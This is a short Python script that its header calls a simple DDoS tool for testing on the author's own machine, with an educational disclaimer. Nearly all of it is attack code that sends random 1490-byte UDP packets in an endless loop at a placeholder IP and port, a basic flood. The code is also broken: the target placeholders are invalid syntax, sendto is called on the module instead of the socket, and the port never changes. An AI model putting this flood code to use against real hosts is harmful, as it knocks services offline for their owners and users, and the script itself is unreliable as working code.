#  DISCLAIMER: This code is provided strictly for educational and testing purposes in controlled environments. DO NOT use this code for illegal activities.
#  Simple DDoS-Attack tool for my own machine to test how to block and learn how simple DDoS attack works.
#  Since Python is not efficient for high-rate networking, it cannot generate enough packets for a working DDoS simulation. My prototype DDoS tool might be in C or C++ in the future.
#  Published: 09/10/2025
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(1490)

ip = <"SET_IP">
port = <"SET_PORT">

while True:
  socket.sendto(data, (ip,int(port))) 
  if port == 65534:
    port = 1
